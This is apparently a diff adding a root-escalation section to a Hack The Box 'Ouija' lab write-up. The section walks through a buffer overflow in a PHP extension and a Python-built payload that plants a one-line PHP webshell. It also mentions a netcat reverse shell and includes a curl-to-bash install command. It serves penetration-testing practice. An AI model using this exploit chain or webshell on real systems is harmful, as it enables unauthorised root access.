@@ -1,7 +1,7 @@
 # HTB - Ouija
 
 ### TL;DR
-This is an insane machine running a web server behind a balancing haproxy v2.2.16. This is vulnerable to HTTP request smuggling, which can be abused to reach a subdomain and dump the code of another .js application running on port 3000. Analyzing this code we deduce how a superuser is formed and using this information we launch a hash extension attack, which will allow us to forge a superuser token. Using this token we can query the API endpoint to dump the private key of the low-privileged user. This write-up only contains steps to get user.txt.
+This is an insane Ubuntu 22.04.3 machine running a web server behind a balancing haproxy v2.2.16. This is vulnerable to HTTP request smuggling, which can be abused to reach a subdomain and dump the code of another .js application running on port 3000. Analyzing this code we deduce how a superuser is formed and using this information we launch a hash extension attack, which will allow us to forge a superuser token. Using this token we can query the API endpoint to dump the private key of the low-privileged user. For escalation, we find a parameter accepting user input is vulnerable to buffer overflow. This can be exploited to generate a malicious PHP file in the host, which is fact acts as a webshell run by root.
 
 **Keywords:**<br>
 HTTP request smuggling, SHA-256, hash_extender, API token
@@ -347,3 +347,269 @@ Finally, query the `/file/get` API on port 3000 with this token, and browse file
 ```
 
 ![ouija11](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/44812e01-37ab-41fa-b4ea-d3b3d27e1786)
+
+This shell allows to retrieve the user flag.
+
+### PHASE 3: Root
+Begin from an SSH session for user `leila`
+```markdown
+> ssh -i ./id_rsa leila@ouija.htb
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Feb  9 11:00:38 AM UTC 2024
+
+  System load:                      0.10595703125
+  Usage of /:                       89.7% of 5.07GB
+  Memory usage:                     44%
+  Swap usage:                       0%
+  Processes:                        411
+  Users logged in:                  0
+  IPv4 address for br-f9142471f070: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.244
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:9b61
+
+  => / is using 89.7% of 5.07GB
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Feb  9 10:50:56 2024 from 10.10.14.124
+leila@ouija:~$
+```
+Take the opportunity to enumerate the system.
+```markdown
+> uname -a && cat /etc/os-release
+Linux ouija 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+PRETTY_NAME="Ubuntu 22.04.3 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.3 LTS (Jammy Jellyfish)"
+VERSION_CODENAME=jammy
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+UBUNTU_CODENAME=jammy
+```
+And the user `leila`
+```markdown
+> whoami && id
+leila
+uid=1000(leila) gid=1000(leila) groups=1000(leila)
+```
+List internal running services.
+```markdown
+> netstat -lnput
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      2118/ssh            
+tcp6       0      0 ::1:9999                :::*                    LISTEN      2118/ssh            
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1837/java           
+tcp6       0      0 127.0.0.1:36569         :::*                    LISTEN      1837/java           
+udp        0      0 0.0.0.0:44295           0.0.0.0:*                           - 
+```
+It seems there is an internal server running on port 9999. Restart the SSH session but this time forwarding the port 9999 to Kali.
+```mardkwon
+> ssh -i ./id_rsa -L 9999:127.0.0.1:9999 leila@ouija.htb
+```
+Now the service running on 9999 can be locally browsed in Kali with firefox.
+
+![Untitled00](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5b0dc90d-62e4-4e19-927b-34b0f002dbeb)
+
+The source code of this site is located in the path `/development/server-management_system_id_0/index.php`. Copy the file to Kali for inspection.
+```markdown
+> scp -i ./id_rsa leila@ouija.htb:/development/server-management_system_id_0/index.php .
+index.php                   100% 3084    24.4KB/s   00:00
+```
+The source code contains a call to a function `say_lverifier()` which checks username and password client inputs.
+
+![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/0c519ef3-4ca5-4ae3-a3b3-3190ff6e2330)
+
+The library is located in the path `/usr/lib/php/20220829/lverifier.so`. Download the file in Kali for inspection.
+```markdown
+> scp -i ./id_rsa leila@ouija.htb:/usr/lib/php/20220829/lverifier.so . 
+lverifier.so                100%   42KB 154.9KB/s   00:00    
+```
+Decompile the file `lverifier.so` with `ghidra` and inspect the `say_lverifier()` function, this calls another function `validating_userinput()` for client input sanitization.
+
+![Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ff8852a4-b523-45ae-8067-0f7290d28869)
+
+Navigate to the function `validating_userinput()`. Decompiling was done with `ida` and generating pseudocode (F5).
+
+![Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9d5da11b-0f3f-41ee-bcaa-8dfd71496772)
+
+This part is vulnerable to buffer overflow. The `username` input is stored in a buffer `nu` with an allocated size of 800; however, the user input is not limited. On the other hand, `size_t` buffer type is used to save the size of `username`, which maximum value is 65535 bytes.<br>
+<br>
+Finally, inspect the function `event_recorder`. This is used to write the log after the user input validation finishes.
+
+![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9f33e94a-08b4-46f9-aa52-44d8ed53b474)
+
+To fuzz the buffer overflow we need to set up a test rig running PHP and `gdb` (C/C++ debugger).<br>
+<br>
+The rig machine will be an Ubuntu 22.04.2 host with PHP 8.2. First, install PHP.
+```markdown
+> add-apt-repository ppa:ondrej/php
+
+> apt update && apt install -y php8.2 php8.2-cli php8.2-{bz2,curl,mbstring,intl}
+
+> apt install -y php8.2-fpm
+
+> a2enconf php8.2-fpm
+Enabling conf php8.2-fpm.
+To activate the new configuration, you need to run:
+ systemctl reload apache2
+ 
+> systemctl reload apache2
+```
+Verify PHP installation.
+```markdown
+> php –v
+PHP 8.2.15 (cli) (built: Jan 20 2024 14:17:05) (NTS)
+Copyright (c) The PHP Group
+Zend Engine v4.2.15, Copyright (c) Zend Technologies
+with Zend OPcache v8.2.15, Copyright (c), by Zend Technologies
+```
+Verify `gdb` is installed (that's the case by default in Ubuntu), then install `gef` (gdb enhancer features https://github.com/hugsy/gef).
+```markdown
+> gdb –v
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later http://gnu.org/licenses/gpl.html
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+> bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+```
+Once PHP is installed and running, we will load the `lverifier.so` file.
+```markdown
+> cp /mnt/lverifier.so /usr/lib/php/20220829
+
+> chmod +x /usr/lib/php/20220829/lverifier.so
+```
+Finally, modify the `php.ini` and `lverifier.ini` files.
+```markdown
+> echo "extension=lverifier.so" > /etc/php/8.2/cli/conf.d/50-lverifier.ini
+
+> sed -i 's/enable_dl = Off/enable_dl = On/g' /etc/php/8.2/cli/php.ini
+```
+Run PHP under the `gdb` environment to debug the application.
+```markdown
+> gdb php
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+88 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
+Reading symbols from php...
+(No debugging symbols found in php)
+
+> gef➤  run -a
+Starting program: /usr/bin/php -a
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Interactive shell
+```
+
+![Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/92e355d4-a7e5-4e79-aa1b-24a3b1f97a26)
+
+Make the application crash by sending a large input in the `username` parameter.
+```markdown
+php > $username = str_repeat('A', 4096000);
+php > $x = say_lverifier($username, 'password');
+```
+
+![Untitled6](https://github.com/g1vi/AllTheWriteUps/assets/120142960/23be2d7a-3625-40fe-af69-000e524e50f0)
+
+The application crashes and dumps the register content.
+
+![Untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b7d2389a-171c-41e2-9af6-93e1c814feca)
+
+Before restarting it, add a breakpoint in the `event_recorder` function, this will be useful in the next step.
+```markdown
+b event_recorder
+```
+
+![Untitle8](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c72a23b4-1e9e-4709-a921-dcd8c991e1fa)
+
+In order to control the registers, we need to know the offset of the payloads. For this, create a pattern size 65535 with `pwntools` or `msf-pattern_create`, then feed it to the application and let it crash.<br>
+<br>
+Inspect the content of the `p` and `w` parameters of the `event_recorder` function.
+
+![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/3e81575a-4da1-4038-9ff5-a9d3db023fa4)
+
+And find their position in the pattern.
+
+![Untitle9](https://github.com/g1vi/AllTheWriteUps/assets/120142960/04f01471-9031-4c39-a778-4c4079ef5c08)
+
+So we have found that when we feed a large input in the `username` parameter, it overflows and overwrites parameters `p` (position 16 of the input payload) and `w` (position 128 of the input payload) in the `event_recorder` function. Also, we know the user input for `username`is assigned to a buffer size 800.<br> 
+<br>
+Abusing the buffer overflow we can manipulate the `event_recorder` function parameters, and therefore control the output log path and its content. In fact, manipulating the last part of the log path we can also manipulate the log content.<br>
+<br>
+To get a root shell we will create a directory in the victim machine whose name is PHP code. Then we will use the overflow to write the PHP file to the web directory, so it can be exploited from a web browser. At the end, the final written log will also contain our directory name, which is the PHP code.<br>
+<br>
+First, create a directory in `leila` SSH shell. The directory name itself is actually PHP code.
+```markdown
+> mkdir "/var/tmp/<?=\`\$_GET[0]\`?>"
+```
+To generate the payload, we will use a Python interpreter.
+```markdown
+>>> a = '/var/tmp/<?=`$_GET[0]`?>/../../..//development/server-management_system_id_0/index.php'
+>>> len(a)
+86
+>>> '/'*714 + a + 'A'*64738
+'///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////var/tmp/<?=`$_GET[0]`?>/../../..//development/server-management_system_id_0/index.phpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA….
+```
+
+![Untitle10](https://github.com/g1vi/AllTheWriteUps/assets/120142960/afaf3575-1293-443b-92be-c9a00ee78839)
+
+Back in Kali, capture a login attempt in http://localhost:9999 and use repeater to insert the payload in the `username` parameter.
+
+![Untitled11](https://github.com/g1vi/AllTheWriteUps/assets/120142960/88fd7e73-ae57-4a76-8d39-7e7c83f60eaa)
+
+Send the payload and verify an `index.php` file containing the malicious PHP code has been created in the victim machine in the path `/development/server-management_system_id_0/index.php`
+
+![Untitled12](https://github.com/g1vi/AllTheWriteUps/assets/120142960/3973763b-f55a-4146-adce-44846c308f6b)
+
+Now we can send a reverse shell using the `index.php` file. Let's verify first in a browser we have RCE (i.e. a webshell).
+
+![Untitled13](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c1850e48-c879-43bf-8222-1235521b08e9)
+
+To have a root shell prepare an `nc mkfifo` shell and send with Burpsuite.
+
+![Untitled14](https://github.com/g1vi/AllTheWriteUps/assets/120142960/642c800f-3d18-4916-a8b0-be96f259f154)
+
+A reverse shell is received on port 1919.
+
+![Untitled15](https://github.com/g1vi/AllTheWriteUps/assets/120142960/14720174-a3ab-4f33-ae2b-7f08f3dd27f2)
+
+You are root.
